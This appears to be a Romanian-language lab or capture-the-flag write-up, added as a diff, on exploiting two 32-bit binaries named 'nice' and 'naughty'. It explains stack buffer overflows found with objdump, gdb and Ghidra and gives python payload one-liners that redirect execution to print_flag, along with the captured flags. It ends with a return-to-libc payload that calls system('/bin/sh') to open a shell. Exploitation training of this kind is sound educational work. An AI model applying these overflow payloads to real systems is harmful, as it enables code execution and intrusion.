@@ -1,0 +1,107 @@
+Am folosit utilitarele: objdump, gdb, Ghidra.
+
+Nice:
+Adresa functiei vulnerabile este 0x80492f8.
+Ea este vulnerabila, deoarece se citesc mai multe caractere
+decat dimensiunea buffer-ului, suprascriindu-se variabila locala
+de la adresa ebp-0x3c, care apoi este apelata.Deci putem prelua controlul prin
+suprascrierea variabilei locale cu adresa functiei dorite.
+
+Main:
+Se apeleaza FUN_080492de - adresa 0x80492de
+	Se aloca pe stiva 169 de caractere.(sub esp,0xa9)
+	Se citesc 133 de caractere.
+	Numarul de caractere citite este mai mic decat dimensiunea buffer-ului,		nu se face buffer overflow.
+	
+Se apeleaza FUN_080492f8 - adresa 0x80492f8
+	Se aloca pe stiva 698 de caractere.(sub esp,0x2ba)
+	Variabila locala este la ebp-0x3c.
+	Se citesc 698 de caractere, suprascriindu-se variabila locala,
+	care apoi este apelata.
+	Ea este vulnerabila, pentru ca prin citire se suprascrie variabila
+	locala.
+
+nice_payload:
+
+python -c 'print ("A"*771 + "\x91\x92\x04\x08")' > nice_payload
+La primul read se citesc 133 de caractere.
+La al doilea read se citesc 638 de caractere pana la variabila locala.
+Dupa am suprascris variabila locala cu adresa functiei print_flag.
+(133 + 638)*"A" + adresa functiei print_flag(0x08049291).
+
+NICE_FLAG{adf1829921c42bbaf6c253910b218a31}
+
+NAUGHTY:
+Adresa functiei vulnerabile este 0x804935c.
+Ea este vulnerabila, deoarece se citesc mai multe caractere decat
+dimensiunea buffer-ului, suprascriidu-se variabila locala de la adresa
+ebp - 0x89 si parametrii functiei. Cel de-al doilea parametru este 
+este apelat. Deci putem prelua controlul prin
+suprascrierea lui cu adresa functiei dorite.
+
+Main:
+Se apeleaza functia FUN_080492de - adresa 0x080492de.
+	Se aloca pe stiva 131 de caractere. (sub esp,0x83)
+	Se citesc 57 de caractere.
+	Adresa variabilei locale este epb-0x68.
+	0x83-0x68= 27 caractere pana la variabila locala,
+	dar se citresc 57 de caractere, se face buffer overflow,
+	deci variabila locala se suprascrie.
+	Pentru a nu verifica conditia din if, variabila locala
+	trebuie sa fie 0X080492de a.i. nu se apeleaza exit 
+	si se intoarce in main.
+
+Se apeleaza functia FUN_08049305 - adresa 0x08049305.
+	Se aloca pe stiva 508 de caractere. (sub esp,0x1fc)
+	Se citesc 424 de caractere.
+	Adresa variabilei locale este epb-0xab.
+	0x1fc-0xab=337 caractere pana la variabila locala,
+	dar se citesc 424 de caractere, se face buffer overflow,
+	deci variabila locala se suprascrie.
+	Pentru a nu verifica conditia din if, variabile locala
+	trebuie sa fie 0xca8be612 a.i. nu se apeleaza exit
+	si se intoarce in main.
+
+Se apeleaza functia FUN_08049332 - adresa 0x8049332.
+	Se aloca pe stiva 198 de caractere. (sub esp,0xc6)
+	Se citesc 68 de caractere.
+	Adresa variabilei locale este ebp-0xc1
+	0xc6-0xc1=5 caractere pana la variabila locala,
+	dar se citesc 68 de caractere, se face buffer overflow,
+	deci variabila locala se suprascrie.
+	Pentru a nu verifica conditia din if, variabila locala
+	trebuie sa fie 0x170ac7b7 a.i. nu se apeleaza exit
+	si se intoarce in main.
+
+Se apeleaza functia FUN_0804935c - adresa 0x0804935c.
+	Se aloca pe stiva 339 de caractere. (sub esp,0x153)
+	Se citesc 355 de caractere.
+	Adresa variabilei locale este ebp-0x89.
+	0x153-0x89=202 caractere pana la variabila locala,
+	dar se citesc 355 caractere, se face buffer overflow.
+	deci variabila locala se suprascrie.
+	Pentru a nu verifica conditia din if, variabila locala
+	trebuie sa fie 0x320adb8 a.i. nu se apeleaza exit
+	si se intoarce in main.
+	Deoarece se aloca 339 de caractere pe stiva si se citesc
+	355 se suprascriu si parametrii functiei.
+	Pentru a ajunge la cel de-al doilea parametru, se citesc
+	339 caractere, dupa inca 12 caractere pana la ebp + 12
+	dupa se suprascrie cu adresa functiei print_flag 0x08049291.
+	
+naughty_paylaod:
+python -c 'print ("A"*27 +"\x3c\x97\x81\x2e" + "A"*26 +"B"*337+"\x12\xe6\x8b\xca"+"B"*75+"C"*5+"\xb7\xc7\x0a\x17"+"C"*59+"D"*202+"\xb8\xad\x20\x03"+"D"*133+"D"*12+"\x91\x92\x04\x08") ' > naughty_payload
+
+NAUGHTY_FLAG{7c5177d6e805278a2da9261fc89466f5}
+
+NAUGHTY_SHELLCODE:
+Am cautat adresa functiei system, folosind gdb 0xf7e0a830.
+Am cautat adresa "/bin/sh",folosind gdb 0xf7f57352.
+Am folosit payload-ul de la task-ul 3, unde am suprascris cel de-al doilea
+parametru cu system adress, am adaugat 4*"A" pentru a suprascrie
+adresa de retur,dupa am adaugat "/bin/sh/" adress, fiind primul parametru al functie system.
+Cand am testat in gdb, la final se executa /usr/bin/dash
+process 19383 is executing new program: /usr/bin/dash
+deschizand un shell.
+python -c 'print ("A"*27 +"\x3c\x97\x81\x2e" + "A"*26 +"B"*337+"\x12\xe6\x8b\xca"+"B"*75+"C"*5+"\xb7\xc7\x0a\x17"+"C"*59+"D"*202+"\xb8\xad\x20\x03"+"D"*133+"D"*12+"\x30\xa8\xe0\xf7" +"A"*4 +"\x52\x73\xf5\xf7") ' > naughty_shellcode
+
